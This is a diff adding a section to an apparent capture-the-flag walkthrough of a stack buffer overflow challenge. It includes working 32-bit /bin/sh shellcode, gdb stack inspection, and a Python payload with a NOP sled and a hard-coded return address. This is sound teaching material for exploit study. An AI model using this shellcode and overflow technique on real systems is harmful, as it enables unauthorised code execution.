@@ -249,3 +249,65 @@ Similar to before, we can compile a python script to output this data
 ```python
 python -c 'print("A"*76 + "")'
 ```
+
+## Stack 5
+
+Provided code
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)  
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+
+Now we know we can force the program to jump to code anywhere in the program, but where should we jump this time?
+To break this challenge, we are going to need to inject our own shellcode into the program, and jump to it manually
+
+shellcode = *`\x6a\x0b\x58\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`*
+This was taken from shell-storm. We know the architecture is a 32 bit linux system, this shell code executes /bin/sh
+
+One place we can put this shellcode is in the buffer, its **21**)) bytes, so if we pad the buffer with random data before it, it should work!
+
+So let's craft our payload
+Like before, we will need to pad our payload to **76** bytes before our return address. 
+This is where we introduce a nopsled. **0x90** is an intel command that means _do nothing, go to next command_. So if we just fill our buffer with these, followed by our shellcode, and if we jump to the middle our buffer, it will slide down our nops, into our shellcode. And then pop a shell.
+
+But what address do we want to jump to? 
+**ASLR** stands for Address Space Layout Randomisation, thankfully it isn't enabled on this sytem, so we can find where the stack is.
+
+To do this we can open the program in gdb, and enter AAAAAAAAA.... 
+Now when the program crashes, we can examine the stack by typing `x/64x $esp`
+
+This command does a few things. the x stands for *examine* and is used to examine memory in the stack.
+The 64 is how many words (4 bytes) we want to display, and the x stands for hexadecimal, and sets the output format to print out the memory as hex numbers. The $esp is the starting address for the printing. **$esp** is the *stack pointer* register, and contains an address to the beginning of the stack.
+
+```
+0xbffff7a0:	0xbffff7b0	0xb7ec6165	0xbffff7b8	0xb7eada75
+0xbffff7b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff7c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff7d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff7e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff7f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff800:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff810:	0x41414141	0xffffff00	0xb7ffeff4	0x08048232
+```
+This output is shown so the left column is the address, and right right column is the data, spread in 4 byte segmants
+As we can see, our buffer starts at 0xbffff7b0. This is where our shellcode will be, so we can set this address as our return address.
+
+
+```python
+payload += '\x90' * (76 - 21)
+payload += '\x6a\x0b\x58\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
+payload += '\xb0\xf7\xff\xbf'
+
+print payload
+```
+
+Boom shell
